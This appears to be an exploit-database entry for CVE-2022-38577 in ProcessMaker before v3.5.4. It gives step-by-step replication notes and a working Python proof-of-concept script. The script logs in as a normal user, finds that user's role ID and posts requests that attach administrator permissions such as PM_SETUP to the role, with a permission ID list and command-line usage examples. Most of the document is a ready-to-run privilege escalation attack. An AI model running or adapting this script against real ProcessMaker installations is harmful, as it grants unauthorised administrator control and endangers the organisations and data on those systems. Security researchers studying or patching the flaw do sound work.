@@ -1,0 +1,197 @@
+id: 37976
+date: 09/21/2022
+title: ProcessMaker Privilege Escalation Exploit
+author: Sornram Kampeera
+cves: CVE-2022-38577
+
+# Exploit Title: ProcessMaker - User Profile Privilege Escalation
+# Description: ProcessMaker before v3.5.4 was discovered to contain insecure permissions in the user profile page. This vulnerability allows attackers to escalate normal users to Administrators. 
+# Exploit Author: Sornram Kampeera (Sornram9254)
+# Vendor Homepage: https://www.processmaker.com
+# Software Link: https://sourceforge.net/projects/processmaker/files/ProcessMaker/
+# Version: ProcessMaker before v3.5.4 (Already Tested on 2.5.0, 2.5.2, 3.0 GA and 3.2.1)
+# Tested on: Windows 11, Debian 11 (WSL2)
+# CVE : CVE-2022-38577
+
+"""
+Privilege Escalation replication.
+for 2.5.0 - 3.0 GA:
+    1. Log in as normal user.
+    2. Change "USR_ROLE" on post request form when updating profile information to "PROCESSMAKER_ADMIN".
+    3. Refresh page to get new role.
+
+for 3.2.1 and before:
+    1. Log in as normal user.
+    2. Get Role ID by request "/sysworkflow/en/neoclassic/roles/roles_Ajax?request=rolesList&_dc={epoch_time}"
+    3. Get Permission ID by request "/sysworkflow/en/neoclassic/roles/data_rolesPermissions?rUID={Role_ID}&type=show"
+    4. Update role to escalation privileges using POST Body request:
+    POST /sysworkflow/en/neoclassic/roles/roles_Ajax
+    request=assignPermissionToRoleMultiple&ROL_UID={Role_ID}&PER_UID={PERMISSION_ID}
+"""
+
+#!/usr/bin/python
+# TODO: Optimize code [requests module], and Exception Handling.
+# Replace the variables USERNAME, PASSWORD, and APP_URL.
+import requests, json, re, argparse, sys
+USER_AGENT = 'Mozilla/5.0'
+APP_URL = "http://localhost:9994"
+USERNAME = '__USER__'
+PASSWORD = '__PASS__'
+
+parser = argparse.ArgumentParser()
+parser.add_argument("action", type=str, help="Add or Delete role permission.", nargs="?", default=".")
+
+parser.add_argument("-a", "--add",      action="store_true",    help="Add role permission")
+parser.add_argument("-d", "--delete",   action="store_true",    help="Delete role permission")
+parser.add_argument("-l", "--list",     action="store_true",    help="List all roles")
+args = parser.parse_args()
+if args.add:
+    action = "assign"
+elif args.delete:
+    action = "delete"
+elif args.list:
+    action = "list"
+    print("All Permission UID")
+    print("View more: https://wiki.processmaker.com/3.3/Roles")
+    PERM_LIST = """
+PER_UID: 00000000000000000000000000000001, PER_CODE: PM_LOGIN
+PER_UID: 00000000000000000000000000000002, PER_CODE: PM_SETUP
+PER_UID: 00000000000000000000000000000003, PER_CODE: PM_USERS
+PER_UID: 00000000000000000000000000000004, PER_CODE: PM_FACTORY
+PER_UID: 00000000000000000000000000000005, PER_CODE: PM_CASES
+PER_UID: 00000000000000000000000000000006, PER_CODE: PM_ALLCASES
+PER_UID: 00000000000000000000000000000007, PER_CODE: PM_REASSIGNCASE
+PER_UID: 00000000000000000000000000000008, PER_CODE: PM_REPORTS
+PER_UID: 00000000000000000000000000000009, PER_CODE: PM_SUPERVISOR
+PER_UID: 00000000000000000000000000000010, PER_CODE: PM_SETUP_ADVANCE
+PER_UID: 00000000000000000000000000000011, PER_CODE: PM_DASHBOARD
+PER_UID: 00000000000000000000000000000012, PER_CODE: PM_WEBDAV
+PER_UID: 00000000000000000000000000000013, PER_CODE: PM_DELETECASE
+PER_UID: 00000000000000000000000000000014, PER_CODE: PM_EDITPERSONALINFO
+PER_UID: 00000000000000000000000000000015, PER_CODE: PM_FOLDERS_VIEW
+PER_UID: 00000000000000000000000000000016, PER_CODE: PM_FOLDERS_ADD_FOLDER
+PER_UID: 00000000000000000000000000000017, PER_CODE: PM_FOLDERS_ADD_FILE
+PER_UID: 00000000000000000000000000000018, PER_CODE: PM_CANCELCASE
+PER_UID: 00000000000000000000000000000019, PER_CODE: PM_FOLDER_DELETE
+PER_UID: 00000000000000000000000000000020, PER_CODE: PM_SETUP_LOGO
+PER_UID: 00000000000000000000000000000021, PER_CODE: PM_SETUP_EMAIL
+PER_UID: 00000000000000000000000000000022, PER_CODE: PM_SETUP_CALENDAR
+PER_UID: 00000000000000000000000000000023, PER_CODE: PM_SETUP_PROCESS_CATEGORIES
+PER_UID: 00000000000000000000000000000024, PER_CODE: PM_SETUP_CLEAR_CACHE
+PER_UID: 00000000000000000000000000000025, PER_CODE: PM_SETUP_HEART_BEAT
+PER_UID: 00000000000000000000000000000026, PER_CODE: PM_SETUP_ENVIRONMENT
+PER_UID: 00000000000000000000000000000027, PER_CODE: PM_SETUP_PM_TABLES
+PER_UID: 00000000000000000000000000000028, PER_CODE: PM_SETUP_LOGIN
+PER_UID: 00000000000000000000000000000029, PER_CODE: PM_SETUP_DASHBOARDS
+PER_UID: 00000000000000000000000000000030, PER_CODE: PM_SETUP_LANGUAGE
+PER_UID: 00000000000000000000000000000031, PER_CODE: PM_SETUP_SKIN
+PER_UID: 00000000000000000000000000000032, PER_CODE: PM_SETUP_CASES_LIST_CACHE_BUILDER
+PER_UID: 00000000000000000000000000000033, PER_CODE: PM_SETUP_PLUGINS
+PER_UID: 00000000000000000000000000000034, PER_CODE: PM_SETUP_USERS_AUTHENTICATION_SOURCES
+PER_UID: 00000000000000000000000000000035, PER_CODE: PM_SETUP_LOGS
+PER_UID: 00000000000000000000000000000036, PER_CODE: PM_DELETE_PROCESS_CASES
+PER_UID: 00000000000000000000000000000037, PER_CODE: PM_EDITPERSONALINFO_CALENDAR
+PER_UID: 00000000000000000000000000000038, PER_CODE: PM_UNCANCELCASE
+PER_UID: 00000000000000000000000000000039, PER_CODE: PM_REST_API_APPLICATIONS
+PER_UID: 00000000000000000000000000000040, PER_CODE: PM_EDIT_USER_PROFILE_FIRST_NAME
+PER_UID: 00000000000000000000000000000041, PER_CODE: PM_EDIT_USER_PROFILE_LAST_NAME
+PER_UID: 00000000000000000000000000000042, PER_CODE: PM_EDIT_USER_PROFILE_USERNAME
+PER_UID: 00000000000000000000000000000043, PER_CODE: PM_EDIT_USER_PROFILE_EMAIL
+PER_UID: 00000000000000000000000000000044, PER_CODE: PM_EDIT_USER_PROFILE_ADDRESS
+PER_UID: 00000000000000000000000000000045, PER_CODE: PM_EDIT_USER_PROFILE_ZIP_CODE
+PER_UID: 00000000000000000000000000000046, PER_CODE: PM_EDIT_USER_PROFILE_COUNTRY
+PER_UID: 00000000000000000000000000000047, PER_CODE: PM_EDIT_USER_PROFILE_STATE_OR_REGION
+PER_UID: 00000000000000000000000000000048, PER_CODE: PM_EDIT_USER_PROFILE_LOCATION
+PER_UID: 00000000000000000000000000000049, PER_CODE: PM_EDIT_USER_PROFILE_PHONE
+PER_UID: 00000000000000000000000000000050, PER_CODE: PM_EDIT_USER_PROFILE_POSITION
+PER_UID: 00000000000000000000000000000051, PER_CODE: PM_EDIT_USER_PROFILE_REPLACED_BY
+PER_UID: 00000000000000000000000000000052, PER_CODE: PM_EDIT_USER_PROFILE_EXPIRATION_DATE
+PER_UID: 00000000000000000000000000000053, PER_CODE: PM_EDIT_USER_PROFILE_CALENDAR
+PER_UID: 00000000000000000000000000000054, PER_CODE: PM_EDIT_USER_PROFILE_STATUS
+PER_UID: 00000000000000000000000000000055, PER_CODE: PM_EDIT_USER_PROFILE_ROLE
+PER_UID: 00000000000000000000000000000056, PER_CODE: PM_EDIT_USER_PROFILE_TIME_ZONE
+PER_UID: 00000000000000000000000000000057, PER_CODE: PM_EDIT_USER_PROFILE_DEFAULT_LANGUAGE
+PER_UID: 00000000000000000000000000000058, PER_CODE: PM_EDIT_USER_PROFILE_COSTS
+PER_UID: 00000000000000000000000000000059, PER_CODE: PM_EDIT_USER_PROFILE_PASSWORD
+PER_UID: 00000000000000000000000000000060, PER_CODE: PM_EDIT_USER_PROFILE_USER_MUST_CHANGE_PASSWORD_AT_NEXT_LOGON
+PER_UID: 00000000000000000000000000000061, PER_CODE: PM_EDIT_USER_PROFILE_PHOTO
+PER_UID: 00000000000000000000000000000062, PER_CODE: PM_EDIT_USER_PROFILE_DEFAULT_MAIN_MENU_OPTIONS
+PER_UID: 00000000000000000000000000000063, PER_CODE: PM_EDIT_USER_PROFILE_DEFAULT_CASES_MENU_OPTIONS
+PER_UID: 00000000000000000000000000000064, PER_CODE: PM_REASSIGNCASE_SUPERVISOR"""
+    print(PERM_LIST)
+    sys.exit()
+else:
+    print("Example Permission UID")
+    SAMPLE_PERM_LIST = """>>> PER_UID: 00000000000000000000000000000002, PER_CODE: PM_SETUP
+>>> PER_UID: 00000000000000000000000000000010, PER_CODE: PM_SETUP_ADVANCE
+>>> PER_UID: 00000000000000000000000000000033, PER_CODE: PM_SETUP_PLUGINS
+
+python Processmaker-PoC.py --help
+python Processmaker-PoC.py --list
+python Processmaker-PoC.py --add 00000000000000000000000000000002
+python Processmaker-PoC.py --delete 00000000000000000000000000000002"""
+    print(SAMPLE_PERM_LIST)
+    sys.exit()
+
+PERMISSION_UID = args.action
+
+loginData = "__notValidateThisFields__=[{'name':'USR_USERNAME','type':'text','label':'User','validate':'Any','required':'0'}]&"
+loginData += "DynaformRequiredFields=[{'name':'USR_USERNAME','type':'text','label':'User','validate':'Any','required':'0'}]&"
+loginData += "__DynaformName__=sysLogin&"
+loginData += "form[BROWSER_TIME_ZONE_OFFSET]=25200&"
+loginData += "form[USR_PASSWORD]=" + PASSWORD + "&"
+loginData += "form[USR_USERNAME]=" + USERNAME + "&"
+loginData += "form[USR_PASSWORD_MASK]=&"
+loginData += "form[USER_ENV]=workflow&"
+loginData += "form[USER_LANG]=en"
+
+def getResponse(rMethod, rHeaders, rUrl,rData=None):
+    SSL_VERIFY = False
+    if rMethod == 'GET':
+        response = requests.get(rUrl, headers=rHeaders, verify=SSL_VERIFY, allow_redirects=True)
+    elif rMethod == "POST":
+        response = requests.post(rUrl, data=rData, headers=rHeaders, verify=SSL_VERIFY, allow_redirects=True)
+    else:
+        print("Please choose correct answer")
+    return response
+
+getCookie = getResponse('POST',
+                        {'Content-Type': 'application/x-www-form-urlencoded', 'User-Agent': USER_AGENT, 'Connection': 'close'},
+                        APP_URL + '/sys/en/neoclassic/login/sysLogin',
+                        loginData).cookies['PHPSESSID']
+if getCookie is not None:
+    getUserID = getResponse( 'GET',
+                                {'User-Agent': USER_AGENT, 'Accept': '*', 'Cookie': 'PHPSESSID=' + getCookie, 'Connection': 'close'},
+                                APP_URL + '/sysworkflow/en/neoclassic/users/usersInit')
+    USER_ID = re.findall(r"USR_UID\s=\s\"(\w{32})\"", getUserID.text, re.MULTILINE)[0]
+
+    getRolesName = getResponse('POST',
+                                {'User-Agent': USER_AGENT, 'Accept': '*', 'Cookie': 'PHPSESSID=' + getCookie,'Content-Type' : 'application/x-www-form-urlencoded', 'Connection': 'close'},
+                                APP_URL + '/sysworkflow/en/neoclassic/users/usersAjax',
+                                'action=userData&USR_UID=' + USER_ID)
+                                
+    getRolesList = getResponse( 'GET',
+                                {'User-Agent': USER_AGENT, 'Accept': '*', 'Cookie': 'PHPSESSID=' + getCookie, 'Connection': 'close'},
+                                APP_URL + '/sysworkflow/en/neoclassic/roles/roles_Ajax?request=rolesList&_dc=')
+
+    getRolesPermission = getResponse('POST',
+                                {'User-Agent': USER_AGENT, 'Accept': '*', 'Cookie': 'PHPSESSID=' + getCookie, 'Connection': 'close'},
+                                APP_URL + '/sysworkflow/en/neoclassic/roles/data_rolesPermissions?rUID=ROLE_UID&type=show')
+
+    roleUID = re.findall(r"\"ROL_UID\":\"(\w{32})\",\"ROL_PARENT\":\"\",\"ROL_SYSTEM\":\"\w{32}\",\"SYS_CODE\":\"PROCESSMAKER\",\"ROL_CODE\":\"" + json.loads(getRolesName.text)['user']['USR_ROLE'] + "\"", getRolesList.text, re.MULTILINE)[0]
+
+def actionRoleResponse():
+    actionRoleStatus = getResponse('POST',
+                                {'User-Agent': USER_AGENT,'Content-Type': 'application/x-www-form-urlencoded','Cookie': 'PHPSESSID=' + getCookie,'Connection': 'close'},
+                                APP_URL + '/sysworkflow/en/neoclassic/roles/roles_Ajax',
+                                'request=' + action + 'PermissionToRoleMultiple&ROL_UID=' + roleUID + '&PER_UID=' + PERMISSION_UID)
+    return actionRoleStatus.status_code
+
+if actionRoleResponse() == 200:
+    print(action.capitalize() + " role successfully.")
+elif actionRoleResponse() == 503:
+    print("Role already exists.")
+else:
+    print("Error!")
+
+#  0day.today [2023-03-27]  #
